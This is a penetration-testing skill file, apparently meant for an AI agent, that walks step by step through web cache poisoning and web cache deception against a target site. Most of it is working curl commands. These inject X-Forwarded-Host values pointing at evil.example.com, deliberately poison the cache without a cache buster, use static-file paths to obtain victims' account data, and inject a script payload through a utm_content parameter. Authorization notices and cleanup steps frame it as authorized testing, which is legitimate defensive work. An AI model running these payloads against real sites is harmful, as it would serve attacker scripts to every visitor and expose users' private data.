---
name: performing-web-cache-poisoning-attack
description: Exploiting web cache mechanisms to serve malicious content to other users by poisoning cached responses through unkeyed headers and parameters during authorized security tests.
subdomain: web-application-security
facing: source
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
upstream: performing-web-cache-poisoning-attack@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Codegraph (do this first)
1. `codegraph_explore "cache key construction"` — locate the cache key builder and the header that feeds it; `callers` for the path into it. Output = read.
2. Changing shared code: `codegraph callers <fn>` + `codegraph impact <fn>` before editing. One root-cause fix, owning layer, every call site covered.
3. Tests: `git diff --name-only | codegraph affected --stdin`. None at the seam = add one.
4. Before "unused"/rename/delete: `codegraph sync`, then grep. No graph yet: grep for the sinks above.
Any "grep/search the codebase" step below → use these calls instead; keep grep for strings, config and dynamic refs.

## Prerequisites

- **Authorization**: Written penetration testing agreement explicitly covering cache poisoning testing
- **Burp Suite Professional**: With Param Miner extension for automated unkeyed header discovery
- **curl**: For manual cache testing with precise header control
- **Target knowledge**: Understanding of caching layer (CDN provider, cache headers)
- **Cache buster**: Unique query parameter to isolate test requests from other users
- **Caution**: Cache poisoning affects all users; test with cache-busting parameters first

## Workflow

### Step 1: Identify Caching Layer and Behavior

Determine what caching infrastructure is in use and how cache key is constructed.

```bash
# Check cache-related response headers
curl -s -I "https://target.example.com/" | grep -iE \
  "(cache-control|x-cache|cf-cache|age|vary|x-varnish|x-served-by|cdn|via)"

# Common cache indicators:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT / MISS / DYNAMIC (Cloudflare)
# Age: 120 (seconds since cached)
# X-Varnish: 12345 67890 (Varnish)
# Via: 1.1 varnish (Varnish/CDN proxy)

# Determine cache key by testing variations
# Cache key typically includes: Host + Path + Query string

# Test 1: Same URL, two requests - check if second is cached
curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"
curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"
# First: MISS, Second: HIT = caching is active

# Test 2: Vary header behavior
curl -s -I "https://target.example.com/" | grep -i "vary"
# Vary: Accept-Encoding means Accept-Encoding is part of cache key
```

### Step 2: Discover Unkeyed Inputs with Param Miner

Use Burp's Param Miner to find headers and parameters not included in cache key but reflected in responses.

```
# In Burp Suite:
# 1. Install Param Miner from BApp Store
# 2. Right-click target request > Extensions > Param Miner > Guess headers
# 3. Param Miner will test hundreds of HTTP headers
# 4. Check results in Extender > Extensions > Param Miner > Output

# Common unkeyed headers to test manually:
# X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto
# X-Original-URL, X-Rewrite-URL
# X-Host, X-Forwarded-Server
# Origin, Referer
# X-Forwarded-For, True-Client-IP
```

```bash
# Manual testing for unkeyed header reflection
# Add cache buster to isolate testing
CB="cachebuster=$(date +%s)"

# Test X-Forwarded-Host reflection
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?$CB" | grep "evil.example.com"

# Test X-Forwarded-Scheme
curl -s -H "X-Forwarded-Scheme: nothttps" \
  "https://target.example.com/?$CB" | grep "nothttps"

# Test X-Original-URL (path override)
curl -s -H "X-Original-URL: /admin" \
  "https://target.example.com/?$CB"

# Test X-Forwarded-Proto
curl -s -H "X-Forwarded-Proto: http" \
  "https://target.example.com/?$CB" | grep "http://"
```

### Step 3: Exploit Unkeyed Header for Cache Poisoning

Craft requests that poison cached responses with malicious content.

```bash
# Scenario: X-Forwarded-Host reflected in resource URLs
# Normal response includes: <script src="https://target.example.com/app.js">
# Poisoned: <script src="https://evil.example.com/app.js">

# Step 1: Confirm reflection with cache buster
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?cb=unique123" | \
  grep "evil.example.com"

# Step 2: Poison the actual cached page (WITHOUT cache buster)
# WARNING: This affects all users - only do with explicit authorization
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/"

# Step 3: Verify cache is poisoned
curl -s "https://target.example.com/" | grep "evil.example.com"
# If evil.example.com appears, the cache is poisoned

# Attack with X-Forwarded-Proto for HTTP downgrade
curl -s -H "X-Forwarded-Proto: http" \
  "https://target.example.com/?cb=unique456"
# May cause cached response to include http:// links, enabling MitM

# Attack with multiple headers
curl -s \
  -H "X-Forwarded-Host: evil.example.com" \
  -H "X-Forwarded-Proto: https" \
  "https://target.example.com/?cb=unique789"
```

### Step 4: Test Web Cache Deception

Trick cache into storing authenticated responses for public URLs.

```bash
# Web Cache Deception attack
# The cache caches based on file extension (.css, .js, .jpg)
# If the application ignores path suffixes:

# Step 1: As victim (authenticated), visit:
# https://target.example.com/account/profile/nonexistent.css
# If the application returns the profile page (ignoring .css suffix)
# AND the cache stores it because of .css extension...

# Test application path handling
curl -s -H "Authorization: Bearer $VICTIM_TOKEN" \
  "https://target.example.com/account/profile/test.css" | \
  grep -i "email\|name\|balance"

# Step 2: As attacker (unauthenticated), request:
curl -s "https://target.example.com/account/profile/test.css"
# If victim's profile data is returned, cache deception is confirmed

# Test various static extensions
for ext in css js jpg png gif ico svg woff woff2 ttf; do
  echo -n ".$ext: "
  curl -s -H "Authorization: Bearer $TOKEN" \
    -o /dev/null -w "%{http_code} %{size_download}" \
    "https://target.example.com/account/settings/x.$ext"
  echo
done

# Test path confusion patterns
# /account/settings%2f..%2fstatic/style.css
# /account/settings/..;/static/style.css
# /account/settings;.css
```

### Step 5: Test Parameter-Based Cache Poisoning

Exploit unkeyed query parameters or parameter parsing differences.

```bash
# Unkeyed parameter (parameter not in cache key but reflected)
# Using UTM parameters that are often excluded from cache keys
curl -s "https://target.example.com/?utm_content=<script>alert(1)</script>&cb=$(date +%s)" | \
  grep "alert"

# Parameter cloaking via parsing differences
# Backend sees: callback=evil, Cache key ignores: callback
curl -s "https://target.example.com/jsonp?callback=alert(1)&cb=$(date +%s)"

# Fat GET request (body in GET request)
curl -s -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=evil_value" \
  "https://target.example.com/page?cb=$(date +%s)"

# Cache key normalization differences
# Some caches normalize query string order, some don't
curl -s "https://target.example.com/page?a=1&b=2" # Cached as key1
curl -s "https://target.example.com/page?b=2&a=1" # Same key? Or different?

# Test port-based cache poisoning
curl -s -H "Host: target.example.com:1234" \
  "https://target.example.com/?cb=$(date +%s)" | grep "1234"
```

### Step 6: Validate Impact and Clean Up

Confirm attack impact and ensure poisoned cache entries are cleared.

```bash
# Verify poisoned cache serves to other users
# Use a different IP/User-Agent/session to verify
curl -s -H "User-Agent: CacheVerification" \
  "https://target.example.com/" | grep "evil"

# Check cache TTL to understand exposure window
curl -s -I "https://target.example.com/" | grep -i "cache-control\|max-age\|s-maxage"
# max-age=3600 means poisoned for 1 hour

# Clean up: Force cache refresh
# Some CDNs allow purging via API
# Cloudflare: API call to purge cache
# Varnish: PURGE method
curl -s -X PURGE "https://target.example.com/"
# Or wait for TTL to expire

# Document the cache poisoning window
# Start time: when poison request was sent
# End time: start time + max-age
# Affected users: all users hitting the cached URL during the window
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Cache Key** | Set of request attributes (host, path, query) used to identify cached responses |
| **Unkeyed Input** | HTTP headers or parameters not included in cache key but reflected in responses |
| **Cache Poisoning** | Injecting malicious content into cached responses that are served to other users |
| **Cache Deception** | Tricking cache into storing authenticated/private responses as public content |
| **Vary Header** | HTTP header specifying which request headers should be included in cache key |
| **Cache Buster** | Unique query parameter used to prevent affecting real cache during testing |
| **TTL (Time to Live)** | Duration cached response remains valid before being refreshed |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and cache behavior analysis |
| **Param Miner (Burp Extension)** | Automated discovery of unkeyed HTTP headers and parameters |
| **Web Cache Vulnerability Scanner** | Automated cache poisoning detection tool |
| **curl** | Manual HTTP request crafting with precise header control |
| **Varnishlog** | Varnish cache debugging and log analysis |
| **CDN-specific tools** | Cloudflare Analytics, Akamai Pragma headers for cache diagnostics |

### Scenario 1: X-Forwarded-Host Script Injection

Application reflects the `X-Forwarded-Host` header in script src URLs. This header is not part of cache key. Sending request with `X-Forwarded-Host: evil.com` poisons cache to load JavaScript from attacker's server for all subsequent visitors.

### Scenario 2: Web Cache Deception on Account Page

Cloudflare-cached application ignores unknown path segments. Requesting `/account/profile/logo.png` returns account page while Cloudflare caches it as static image. Any unauthenticated user can then access cached account page.

### Scenario 3: Parameter-Based XSS via Cache

UTM tracking parameters are excluded from cache key but rendered in page HTML. Injecting `<script>` tags via `utm_content` parameter poisons cache with stored XSS affecting all visitors.

### Scenario 4: CDN Cache Poisoning via Host Header

Multiple applications are behind same CDN. Manipulating Host header causes CDN to cache response from one application under another application's cache key.

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-web-cache-poisoning-attack
